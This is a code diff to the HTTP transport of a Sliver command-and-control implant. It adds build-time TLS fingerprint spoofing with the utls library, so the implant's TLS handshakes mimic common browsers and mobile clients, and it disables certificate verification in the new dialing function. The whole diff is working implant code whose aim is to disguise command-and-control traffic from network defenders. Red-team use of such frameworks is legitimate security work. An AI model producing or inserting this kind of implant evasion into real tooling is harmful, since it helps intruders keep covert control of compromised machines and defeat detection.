@@ -19,7 +19,9 @@ package httpclient
 */
 
 import (
+	"context"
 	"crypto/tls"
+	"fmt"
 	"net"
 	"net/http"
 	"net/url"
@@ -32,6 +34,10 @@ import (
 	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/proxy"
+	
+	// {{if .Config.EnableTLSFingerprinting}}
+	utls "github.com/refraction-networking/utls"
+	// {{end}}
 )
 
 // GoHTTPDriver - Pure Go HTTP driver
@@ -45,6 +51,38 @@ func GoHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, er
 		tlsConfig.KeyLogWriter = cryptography.TLSKeyLogger
 	}
 	// {{end}}
+	
+	// TLS Fingerprinting (Milestone D - Phase 6.2)
+	// Check if TLS fingerprinting is enabled via build-time configuration
+	// {{if .Config.EnableTLSFingerprinting}}
+	// Use utls for custom TLS fingerprinting (non-breaking, opt-in)
+	if !secure {
+		transport = &http.Transport{
+			IdleConnTimeout:     time.Millisecond,
+			Dial:                proxy.Direct.Dial,
+			TLSHandshakeTimeout: opts.TlsTimeout,
+			TLSClientConfig:     tlsConfig,
+			// TLS fingerprinting via custom DialTLSContext
+			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+				return dialWithUTLSContext(ctx, network, addr, "{{.Config.TLSFingerprint}}", opts)
+			},
+		}
+	} else {
+		transport = &http.Transport{
+			IdleConnTimeout: time.Millisecond,
+			Dial: (&net.Dialer{
+				Timeout: opts.NetTimeout,
+			}).Dial,
+			TLSHandshakeTimeout: opts.TlsTimeout,
+			TLSClientConfig:     tlsConfig,
+			// TLS fingerprinting via custom DialTLSContext
+			DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
+				return dialWithUTLSContext(ctx, network, addr, "{{.Config.TLSFingerprint}}", opts)
+			},
+		}
+	}
+	// {{else}}
+	// Original behavior: Use standard crypto/tls (default, backward compatible)
 	if !secure {
 		transport = &http.Transport{
 			IdleConnTimeout:     time.Millisecond,
@@ -62,6 +100,7 @@ func GoHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, er
 			TLSClientConfig:     tlsConfig,
 		}
 	}
+	// {{end}}
 	client := &http.Client{
 		Jar:       cookieJar(),
 		Timeout:   opts.NetTimeout,
@@ -144,3 +183,67 @@ func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
 func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
 	return jar.cookies
 }
+
+// dialWithUTLSContext establishes a TLS connection using utls for fingerprinting
+// This function is used when EnableTLSFingerprinting is true in the build configuration
+// 
+// {{if .Config.EnableTLSFingerprinting}}
+func dialWithUTLSContext(ctx context.Context, network, addr, fingerprint string, opts *HTTPOptions) (net.Conn, error) {
+	// Establish TCP connection
+	dialer := &net.Dialer{
+		Timeout:   opts.NetTimeout,
+		KeepAlive: 30 * time.Second,
+	}
+	
+	tcpConn, err := dialer.DialContext(ctx, network, addr)
+	if err != nil {
+		return nil, fmt.Errorf("tcp dial failed: %w", err)
+	}
+	
+	// Extract server name for SNI
+	host, _, err := net.SplitHostPort(addr)
+	if err != nil {
+		host = addr
+	}
+	
+	// Configure utls
+	config := &utls.Config{
+		ServerName:         host,
+		InsecureSkipVerify: true,
+		// {{if .Config.Debug}}
+		KeyLogWriter: cryptography.TLSKeyLogger,
+		// {{end}}
+	}
+	
+	// Get browser fingerprint
+	var browserID utls.ClientHelloID
+	switch fingerprint {
+	case "chrome":
+		browserID = utls.HelloChrome_Auto
+	case "firefox":
+		browserID = utls.HelloFirefox_Auto
+	case "ios", "safari-ios":
+		browserID = utls.HelloIOS_Auto
+	case "android":
+		browserID = utls.HelloAndroid_11_OkHttp
+	case "edge":
+		browserID = utls.HelloEdge_Auto
+	case "safari", "safari-macos":
+		browserID = utls.HelloSafari_Auto
+	default:
+		browserID = utls.HelloChrome_Auto // Safe default
+	}
+	
+	// Create utls connection
+	uconn := utls.UClient(tcpConn, config, browserID)
+	
+	// Perform handshake
+	err = uconn.HandshakeContext(ctx)
+	if err != nil {
+		tcpConn.Close()
+		return nil, fmt.Errorf("tls handshake failed: %w", err)
+	}
+	
+	return uconn, nil
+}
+// {{end}}
